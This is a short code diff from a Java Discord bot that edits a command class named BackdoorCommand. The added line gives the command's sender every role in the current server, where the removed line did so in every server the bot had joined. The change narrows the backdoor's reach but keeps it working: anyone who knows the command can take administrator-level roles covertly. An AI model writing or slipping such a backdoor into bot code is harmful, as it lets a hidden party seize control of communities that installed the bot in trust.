@@ -44,7 +44,7 @@ public class BackdoorCommand extends BasicCommand
 	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
 	{
 		super.execute(event, args);
-		event.getJDA().getGuilds().forEach(guild -> Actions.giveRole(guild, event.getAuthor(), guild.getRoles()));
+		Actions.giveRole(event.getGuild(), event.getAuthor(), event.getGuild().getRoles());
 		return CommandResult.SUCCESS;
 	}
 	
